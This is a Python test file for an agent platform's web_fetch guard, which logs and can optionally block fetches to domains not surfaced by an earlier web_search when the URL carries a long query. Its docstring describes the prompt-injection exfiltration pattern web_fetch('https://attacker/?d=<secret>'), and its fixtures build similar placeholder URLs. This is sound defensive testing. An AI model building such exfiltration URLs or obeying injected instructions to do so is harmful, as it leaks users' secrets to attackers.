"""Tests for PI-002 出网外泄观测: the source-domain registry + web_fetch's novel-domain
exfil guard (项目审计-提示注入专项 §五 PI-002).

The indirect-prompt-injection exfil pattern is a model-fabricated NOVEL domain carrying a
long opaque query (the secret): ``web_fetch("https://attacker/?d=<secret>")``. The SSRF
guard blocks only INTERNAL targets, so a public exfil URL passes. The deterministic tell
the platform owns: a legitimate deep-read targets a domain ``web_search`` surfaced this
conversation, whereas an exfil URL does not. ``web_search`` records the domains it surfaced
(``SourceDomainRegistry``); ``web_fetch`` ALWAYS logs the novel-domain + long-query tell and
refuses it only under the opt-in ``web_fetch_block_novel_query`` flag (default off — observe,
don't break).
"""

from pathlib import Path

import httpx

from agentcore.tools.builtin.web import search as search_mod
from agentcore.tools.builtin.web import search_cache as search_cache_mod
from agentcore.tools.builtin.web import source_domains as source_domains_mod
from agentcore.tools.builtin.web import web_fetch as web_fetch_mod
from agentcore.tools.builtin.web.search import WebSearchTool
from agentcore.tools.builtin.web.search_backend import SearchResult
from agentcore.tools.builtin.web.search_cache import SearchCacheRegistry
from agentcore.tools.builtin.web.source_domains import (
    ConversationSourceDomains,
    SourceDomainRegistry,
)
from agentcore.tools.builtin.web.web_fetch import _SUSPICIOUS_QUERY_LEN, WebFetchTool
from agentcore.tools.protocol import ToolContext
from agentcore.tools.sandbox.subprocess import SubprocessSandbox
from agentcore.workspace.server import ServerWorkspace


def _ctx(conversation_id: str = "") -> ToolContext:
    return ToolContext.create(
        execution_id="e",
        run_id="s",
        agent_id="a",
        backend=ServerWorkspace(root=Path("."), sandbox=SubprocessSandbox()),
        user_id="u",
        conversation_id=conversation_id,
    )


def _long_query_url(host: str = "novel.example.com") -> str:
    """A URL whose query component is >= the suspicious length (an exfil-bandwidth proxy)."""
    secret = "x" * (_SUSPICIOUS_QUERY_LEN + 8)
    return f"https://{host}/collect?d={secret}"


class _LogSpy:
    """Captures ``logger.warning`` calls so a test can assert the structured observe log.

    ``cache_logger_on_first_use=True`` makes ``structlog.testing.capture_logs`` unreliable
    for an already-bound module logger, so the guard's module-level ``logger`` is swapped
    for this spy instead — deterministic and independent of the logging config.
    """

    def __init__(self) -> None:
        self.warnings: list[tuple[str, dict]] = []

    def warning(self, event: str, **kwargs: object) -> None:
        self.warnings.append((event, dict(kwargs)))

    def info(self, *args: object, **kwargs: object) -> None:  # pragma: no cover - unused
        pass

    def error(self, *args: object, **kwargs: object) -> None:  # pragma: no cover - unused
        pass


# --- ConversationSourceDomains: one conversation's bounded surfaced-domain set ---


def test_conversation_source_domains_record_and_has():
    s = ConversationSourceDomains()
    s.record({"a.com", "b.com"})
    assert s.has("a.com") is True
    assert s.has("b.com") is True
    assert s.has("never.com") is False


def test_conversation_source_domains_cap_lru_evicts_oldest():
    s = ConversationSourceDomains(max_domains=2)
    s.record({"a.com"})
    s.record({"b.com"})
    s.record({"c.com"})  # over the cap → least-recent (a.com) evicted
    assert s.has("a.com") is False
    assert s.has("b.com") is True
    assert s.has("c.com") is True


def test_conversation_source_domains_record_skips_empty():
    s = ConversationSourceDomains()
    s.record({"", "a.com"})  # blank domain ignored
    assert s.has("a.com") is True
    assert len(s) == 1


# --- SourceDomainRegistry: process-wide conversation -> surfaced-domain map ---


def test_registry_record_and_has_domain():
    reg = SourceDomainRegistry()
    reg.record("c1", {"a.com", "b.com"})
    assert reg.has_domain("c1", "a.com") is True
    assert reg.has_domain("c1", "b.com") is True
    assert reg.has_domain("c1", "novel.com") is False


def test_registry_is_scoped_per_conversation():
    reg = SourceDomainRegistry()
    reg.record("c1", {"a.com"})
    assert reg.has_domain("c1", "a.com") is True
    assert reg.has_domain("c2", "a.com") is False  # another conversation can't see it


def test_registry_unknown_conversation_or_blank_is_false():
    reg = SourceDomainRegistry()
    assert reg.has_domain("missing", "a.com") is False  # unknown conversation → novel
    assert reg.has_domain("", "a.com") is False
    reg.record("c1", {"a.com"})
    assert reg.has_domain("c1", "") is False


def test_registry_record_noop_when_unscoped_or_empty():
    reg = SourceDomainRegistry()
    reg.record("", {"a.com"})  # no conversation scope → ignored
    reg.record("c1", set())  # nothing to record
    assert len(reg) == 0


def test_registry_caps_conversation_count_lru():
    reg = SourceDomainRegistry(max_conversations=2)
    reg.record("a", {"x.com"})
    reg.record("b", {"x.com"})
    reg.record("c", {"x.com"})
    assert len(reg) == 2
    assert "a" not in reg  # LRU-evicted
    assert "c" in reg


def test_registry_has_domain_refreshes_lru_recency():
    # has_domain() is an access — it must move the entry to most-recent so a hot
    # conversation isn't count-evicted while it is still being read.
    reg = SourceDomainRegistry(max_conversations=2)
    reg.record("a", {"x.com"})
    reg.record("b", {"y.com"})
    assert reg.has_domain("a", "x.com") is True  # touch 'a' → now most-recent
    reg.record("c", {"z.com"})  # evicts the LRU, now 'b'
    assert "a" in reg
    assert "b" not in reg
    assert "c" in reg


def test_registry_reaps_idle_conversation():
    reg = SourceDomainRegistry(conversation_ttl_seconds=10.0)
    reg.record("idle", {"x.com"})
    reg._sets["idle"].last_access -= 100  # force past the idle window
    reg.record("fresh", {"y.com"})  # a write triggers idle reaping
    assert "idle" not in reg
    assert "fresh" in reg


# --- web_fetch._guard_novel_domain_exfil: the observe / refuse decision ---


def test_guard_quiet_for_unscoped_call(monkeypatch):
    monkeypatch.setattr(source_domains_mod, "_registry", SourceDomainRegistry())
    spy = _LogSpy()
    monkeypatch.setattr(web_fetch_mod, "logger", spy)
    # no conversation scope → no surfaced-domain set to compare against → never guarded
    assert WebFetchTool._guard_novel_domain_exfil(_long_query_url(), "") is None
    assert spy.warnings == []


def test_guard_quiet_for_short_query(monkeypatch):
    monkeypatch.setattr(source_domains_mod, "_registry", SourceDomainRegistry())
    spy = _LogSpy()
    monkeypatch.setattr(web_fetch_mod, "logger", spy)
    # a novel domain but a plain URL (no / short query) carries no exfil bandwidth
    assert WebFetchTool._guard_novel_domain_exfil("https://novel.example.com/article", "c1") is None
    assert spy.warnings == []


def test_guard_quiet_for_surfaced_domain(monkeypatch):
    reg = SourceDomainRegistry()
    reg.record("c1", {"known.example.com"})  # web_search surfaced it this conversation
    monkeypatch.setattr(source_domains_mod, "_registry", reg)
    monkeypatch.setattr(web_fetch_mod.settings, "web_fetch_block_novel_query", True)
    spy = _LogSpy()
    monkeypatch.setattr(web_fetch_mod, "logger", spy)
    # even with the block flag on AND a long query, a deep-read of a surfaced domain passes
    # (and is not even logged — it never reached the novel-domain branch)
    assert (
        WebFetchTool._guard_novel_domain_exfil(_long_query_url("known.example.com"), "c1") is None
    )
    assert spy.warnings == []


def test_guard_observes_novel_domain_by_default_but_allows(monkeypatch):
    monkeypatch.setattr(source_domains_mod, "_registry", SourceDomainRegistry())
    monkeypatch.setattr(web_fetch_mod.settings, "web_fetch_block_novel_query", False)
    spy = _LogSpy()
    monkeypatch.setattr(web_fetch_mod, "logger", spy)

    decision = WebFetchTool._guard_novel_domain_exfil(_long_query_url(), "c1")

    assert decision is None  # default posture: observe, don't break
    assert len(spy.warnings) == 1
    event, fields = spy.warnings[0]
    assert event == "tool.web_fetch_novel_domain"
    assert fields["blocked"] is False
    assert fields["site"] == "novel.example.com"
    assert fields["query_len"] >= _SUSPICIOUS_QUERY_LEN


def test_guard_blocks_novel_domain_under_flag(monkeypatch):
    monkeypatch.setattr(source_domains_mod, "_registry", SourceDomainRegistry())
    monkeypatch.setattr(web_fetch_mod.settings, "web_fetch_block_novel_query", True)
    spy = _LogSpy()
    monkeypatch.setattr(web_fetch_mod, "logger", spy)

    decision = WebFetchTool._guard_novel_domain_exfil(_long_query_url(), "c1")

    assert decision is not None
    assert "拦截" in decision  # honest, model-facing block string
    assert len(spy.warnings) == 1
    assert spy.warnings[0][1]["blocked"] is True  # logged regardless of allow / refuse


# --- web_fetch.execute: the guard sits on the cache-miss outbound path ---


async def test_execute_blocks_novel_domain_exfil_without_fetching(monkeypatch):
    monkeypatch.setattr(source_domains_mod, "_registry", SourceDomainRegistry())
    monkeypatch.setattr(web_fetch_mod.settings, "web_fetch_block_novel_query", True)
    fetches = {"n": 0}

    async def _allow(_url: str):
        return None

    async def _fake_request(_client, _method, url, **_kwargs):
        fetches["n"] += 1
        return httpx.Response(200, html="<p>x</p>", request=httpx.Request("GET", url))

    monkeypatch.setattr(web_fetch_mod, "_classify_url", _allow)
    monkeypatch.setattr(web_fetch_mod, "_safe_request", _fake_request)

    result = await WebFetchTool().execute({"url": _long_query_url()}, _ctx("conv-block"))

    assert result.success is False
    assert "拦截" in result.error
    assert fetches["n"] == 0  # refused BEFORE any outbound GET — no secret leaves the box


async def test_execute_allows_surfaced_domain_even_with_long_query(monkeypatch):
    reg = SourceDomainRegistry()
    reg.record("conv-known", {"known.example.com"})
    monkeypatch.setattr(source_domains_mod, "_registry", reg)
    monkeypatch.setattr(web_fetch_mod.settings, "web_fetch_block_novel_query", True)
    fetches = {"n": 0}

    async def _allow(_url: str):
        return None

    async def _fake_request(_client, _method, url, **_kwargs):
        fetches["n"] += 1
        return httpx.Response(
            200, html="<html><body><p>ok</p></body></html>", request=httpx.Request("GET", url)
        )

    monkeypatch.setattr(web_fetch_mod, "_classify_url", _allow)
    monkeypatch.setattr(web_fetch_mod, "_safe_request", _fake_request)

    result = await WebFetchTool().execute(
        {"url": _long_query_url("known.example.com")}, _ctx("conv-known")
    )

    assert result.success is True
    assert fetches["n"] == 1  # a surfaced domain is a legitimate deep-read → fetched


async def test_web_search_surfaces_domain_so_later_web_fetch_is_allowed(monkeypatch):
    # End-to-end PI-002 contract: web_search RECORDS the domains it surfaced, so a
    # follow-up web_fetch deep-read of one of them is recognised (not a novel exfil
    # domain) even under the block flag.
    monkeypatch.setattr(source_domains_mod, "_registry", SourceDomainRegistry())
    monkeypatch.setattr(search_cache_mod, "_registry", SearchCacheRegistry())
    monkeypatch.setattr(web_fetch_mod.settings, "web_fetch_block_novel_query", True)

    class _Backend:
        async def search(self, query, max_results=5, on_phase=None, *, language=None):
            return [SearchResult("T", "https://research.example.com/article?id=1", "snip")]

    monkeypatch.setattr(search_mod, "get_search_backend", lambda: _Backend())

    fetches = {"n": 0}

    async def _allow(_url: str):
        return None

    async def _fake_request(_client, _method, url, **_kwargs):
        fetches["n"] += 1
        return httpx.Response(
            200, html="<html><body><p>ok</p></body></html>", request=httpx.Request("GET", url)
        )

    monkeypatch.setattr(web_fetch_mod, "_classify_url", _allow)
    monkeypatch.setattr(web_fetch_mod, "_safe_request", _fake_request)

    ctx = _ctx("conv-pi002-e2e")
    await WebSearchTool().execute({"query": "research"}, ctx)  # surfaces research.example.com
    result = await WebFetchTool().execute(
        {"url": _long_query_url("research.example.com")}, ctx
    )

    assert result.success is True
    assert fetches["n"] == 1  # surfaced by the prior search → not treated as novel exfil
